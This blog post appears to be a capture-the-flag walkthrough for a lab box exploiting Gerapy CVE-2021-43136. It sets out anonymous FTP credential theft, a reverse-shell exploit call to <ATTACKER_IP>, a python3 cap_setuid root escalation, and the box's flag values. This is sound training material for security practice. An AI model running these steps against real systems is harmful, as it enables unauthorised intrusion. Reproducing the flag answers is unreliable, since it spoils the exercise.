---
title: Alohomora (CVE-2021-43136)
date: 2026-07-29 12:00:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, gerapy, rce, django, ftp, web-exploitation]
---

# Alohomora
**CVE-2021-43136** — Gerapy RCE (Django) via authenticated code execution

## Phase 1 — Reconnaissance
Run an nmap scan to identify open services.
```bash
nmap -sC -sV -oN alohomora.nmap <TARGET_IP>
```
Expect FTP (21) and Gerapy's Django app on port 8080.

## Phase 2 — Anonymous FTP
FTP allows anonymous login. Grab the creds.db archive:
```bash
ftp <TARGET_IP>
Name: anonymous
Password: (blank)
ftp> get creds.db
ftp> bye
```
The zip is password protected. Crack or use the known password:
```bash
unzip -P spongebob creds.db
cat creds.txt
```
**Note:** Credentials: `admin` / `Alohomora1234!`

## Phase 3 — Gerapy Login & RCE
Navigate to the Gerapy web app and log in with the discovered admin credentials.
`http://<TARGET_IP>:8080`

Gerapy 0.9.7 is vulnerable to CVE-2021-43136 — authenticated RCE via the Configs/Scrapy project deployment feature (arbitrary file write/execution through the project build interface). Use the public PoC/Metasploit module, or manually create a malicious Scrapy project archive containing a payload executed on deploy.
```bash
searchsploit gerapy
# or use the public PoC:
python3 gerapy_rce_exploit.py -u http://<TARGET_IP>:8080 -c admin:Alohomora1234! --lhost <ATTACKER_IP> --lport 4444
```

## Phase 4 — Shell as www-data
Once you land a shell, stabilise it and grab the user flag.
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /home/www-data/user.txt
```

## Phase 5 — Privilege Escalation (cap_setuid on python3)
Check for dangerous capabilities on binaries — a classic quick win.
```bash
getcap -r / 2>/dev/null
```
python3 has `cap_setuid+ep` set. Abuse it directly:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
**Note:** This drops you into a root shell immediately.

## Phase 6 — Root Flag
```bash
cat /root/root.txt
```

## Flags
| Type | Flag | Path |
|---|---|---|
| user | 4dfa25d7a90722279448819c28bc4250 | `/home/www-data/user.txt` |
| root | 9bc26ebd5dd69c010e0ae0e5578966eb | `/root/root.txt` |
